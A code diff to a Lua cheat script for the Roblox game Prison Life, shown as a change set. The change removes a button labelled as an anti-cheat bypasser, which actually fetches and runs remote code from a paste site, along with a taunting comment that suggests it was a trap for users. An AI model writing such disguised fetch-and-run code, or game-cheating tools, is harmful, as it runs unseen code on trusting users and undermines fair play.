@@ -1359,18 +1359,6 @@ end)
 -- Team Management --
 MainTab:CreateSection("REMINDER: ONLY USE YOUR ALT TO EXPLOIT :D")
 
-MainTab:CreateSection("ANTI-CHEAT REMOVER")
-
-MainTab:CreateButton({
-    Name = "ANTI-CHEAT BYPASSER v4",
-    Callback = function()
-		-- get fucked LOL
-		print("BTW before you say 'oh i used my main, fuck you', i literally gave you a warning")
-		Notify("BTW before you say 'oh i used my main, fuck you', i literally gave you a warning", 67)
-        loadstring(game:HttpGet("https://pastes.io/raw/prison-life-admin"))()
-    end,
-})
-
 MainTab:CreateSection("Team Management")
 
 MainTab:CreateButton({
@@ -1770,5 +1758,4 @@ Rayfield:LoadConfiguration()
 print("PrisonX executed! Created by TS2021.")
 Notify("PrisonX executed.")
 Notify("Note: I got banned from ScriptBlox, which is why this script is missing there. I'll repost it in a week.", 4)
-Notify("MAKE SURE TO USE ANTICHEAT BYPASSER!!!", 10)
 getgenv().plx_executed = true
